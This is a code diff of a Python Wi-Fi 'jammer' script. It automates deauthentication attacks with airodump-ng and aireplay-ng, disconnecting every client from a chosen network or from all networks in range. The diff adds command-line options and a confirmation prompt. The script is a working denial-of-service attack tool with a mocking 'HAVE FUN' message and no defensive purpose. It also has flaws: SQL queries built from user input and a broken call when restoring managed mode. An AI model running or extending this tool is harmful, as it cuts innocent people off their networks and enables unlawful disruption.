@@ -2,8 +2,12 @@ import subprocess
 import os
 import time
 import sqlite3
+import optparse
 
-text = """                     ▄▀░░▌
+CRED = '\033[41m'
+CEND = '\033[0m'
+
+text = f"""                     ▄▀░░▌
                    ▄▀▐░░░▌
                 ▄▀▀▒▐▒░░░▌
      ▄▀▀▄   ▄▄▀▀▒▒▒▒▌▒▒░░▌
@@ -17,16 +21,17 @@ text = """                     ▄▀░░▌
 ▒▒▒▒▒▐▒▒▒▒▒▄▀▒▒▒▀▀▀▒▒▒▒▄█▀░░▒▌▀▀▄▄
 ▒▒▒▒▒▒█▒▄▄▀▒▒▒▒▒▒▒▒▒▒▒░░▐▒▀▄▀▄░░░░▀
 ▒▒▒▒▒▒▒█▒▒▒▒▒▒▒▒▒▄▒▒▒▒▄▀▒▒▒▌░░▀▄
-▒▒▒▒▒▒▒▒▀▄▒▒▒▒▒▒▒▒▀▀▀▀▒▒▒▄▀     ▂▃▅▇█▓▒░۩۞۩ jammerDOSway ۩۞۩░▒▓█▇▅▃▂"""
+▒▒▒▒▒▒▒▒▀▄▒▒▒▒▒▒▒▒▀▀▀▀▒▒▒▄▀     ▂▃▅▇█▓▒░۩۞۩ jammerDEAUTHway ۩۞۩░▒▓█▇▅▃▂"""
 print(text)
-CRED = '\033[41m'
-CEND = '\033[0m'
-print("\nHi jumppy :>")
-all_or_one = input(CRED + "\nChoose target" + CEND +"\n(all=y, one=n): ")
-if all_or_one == 'n':
-    wifi_name = input(CRED + "\nGive the name of the WIFI exactly:" + CEND + " ")
-during = input(CRED + "\nFor how many seconds do you want to drop the devices?" + CEND + "\n(0=unlimited): ")
+print("\nHi jumppy :>\n\n")
 
+
+def get_user_input():
+    parse_object = optparse.OptionParser()
+    parse_object.add_option("-t","--target", dest="targetname", type=str, help="Specific target name to be attacked!\nIf all then do not use this parameter!")
+    parse_object.add_option("-n","--number", dest="number_of_packages",type=int, help="How many packages will be sent to the target(s)!(0=unlimited)")
+
+    return parse_object.parse_args()
 
 def getInterfaceName():
     process_of_interface_output = subprocess.getoutput("iw dev | grep Interface")
@@ -80,11 +85,11 @@ def getData(db_name):
     conn = sqlite3.connect(db_name)
     c = conn.cursor()
 
-    bssid = f"""SELECT bssid FROM dump WHERE ESSID ='{wifi_name}'"""
+    bssid = f"""SELECT bssid FROM dump WHERE ESSID ='{targetname}'"""
     c.execute(bssid)
     bssid = c.fetchone()[0]
 
-    channel = f"""SELECT channel FROM dump WHERE ESSID ='{wifi_name}'"""
+    channel = f"""SELECT channel FROM dump WHERE ESSID ='{targetname}'"""
     c.execute(channel)
     channel = c.fetchone()[0]
 
@@ -112,22 +117,18 @@ def getWIFIname(db_name):
     names = c.fetchall()
     return names
 
-
 def getMACs(db_name):
-
     conn = sqlite3.connect(db_name)
     c = conn.cursor()
-
     macs = f"""SELECT StationMAC FROM dump"""
     c.execute(macs)
     macs = c.fetchall()
 
     return macs
 
-
 def drop(device_mac, network_mac, interface_name_monitor):
     print(device_mac)
-    os.system(f"gnome-terminal -- aireplay-ng -0 {during} -a {network_mac} -c {device_mac} --ignore-negative-one {interface_name_monitor}")
+    os.system(f"gnome-terminal -- aireplay-ng -0 {number_of_packages} -a {network_mac} -c {device_mac} --ignore-negative-one {interface_name_monitor}")
 
 def clean():
     os.system("rm -rf firstScan/o*")
@@ -135,19 +136,33 @@ def clean():
     os.system("rm -rf allScan/allfScan/o*")
     os.system("rm -rf allScan/allsScan/o*")
 
+def re_eneable_managedmode(interface_name_monitor):
+    os.system(f"airodump-ng stop {interface_name_monitor}")
+
+
+(user_input,arguments) = get_user_input()
+targetname, number_of_packages = user_input.targetname, user_input.number_of_packages
+    
+print(f"Options:\nTarget: {targetname} (None=all)\nPackage quantity: {number_of_packages}")
+print(CRED + "\nAre you sure to start the attack with the above settings?[Y/n]" + CEND)
+sure = input("\n: ")
+s = ["y", "Y", ""]
+if sure not in s:
+    exit()
 
 clean()
+
 interface_name = getInterfaceName()
 print(interface_name)
-
-
 changeMod(interface_name)
 
 if isMonitor():
     print("The mode has changed to monitor instead of managed.")
     interface_name_monitor = interface_name
 
-    if all_or_one == 'y':
+    if targetname == None:
+        print("All WIFI that the WIFI card can reach have been chosen as target!")
+        time.sleep(1)
         # ALL SCAN
         scanAllnetwork(interface_name_monitor)
         files_allf = os.listdir("./allScan/allfScan")
@@ -160,7 +175,6 @@ if isMonitor():
         db_name = f"./allScan/allfScan/output_of_scan{number_of_files_allf - 1}-01.kismet.csv.db"
         targets, channels = getTargets(db_name)
         names = getWIFIname(db_name)
-
 
         for i in range(0, len(targets)):
 
@@ -199,8 +213,16 @@ if isMonitor():
                     time.sleep(1)
         if counter == len(macs):
             print(CRED + "All devices have been dropped from the WIFI you chose!" + CEND + "\nHAVE FUN :>")
+        re_enable = input("Wanna re-enable managed mode?[Y/n]")
+        if re_enable in s:
+            re_eneable_managedmode()
+            print("Setting your wifi card to its old settings.")
+            time.sleep(3)
+            print("Your network can usable now! Have a good one c:")
 
-    elif all_or_one == 'n':
+    else:
+        print(f"'{targetname}' has been chosen as target!")
+        time.sleep(1)
         ## FIRST SCAN
         scanNetwork(interface_name_monitor)
         files_first = os.listdir("./firstScan")
@@ -227,6 +249,7 @@ if isMonitor():
         macs = getMACs(db_name)
         print(macs)
         counter = 0
+
         for mac in macs:
             mac = str(mac)
             mac = mac[2:19]
@@ -240,6 +263,12 @@ if isMonitor():
                 time.sleep(1)
         if counter == len(macs):
             print(CRED + "All devices have been dropped from the WIFI you chose!" + CEND + "\nHAVE FUN :>")
+        re_enable = input("Wanna re-enable managed mode?[Y/n]")
+        if re_enable in s:
+            re_eneable_managedmode()
+            print("Setting your wifi card to its old settings.")
+            time.sleep(3)
+            print("Your network can usable now! Have a good one c:")
 
 else:
     print("The mode has NOT changed to monitor instead of managed." + CRED +"\nYou should run it as root!" + CEND)
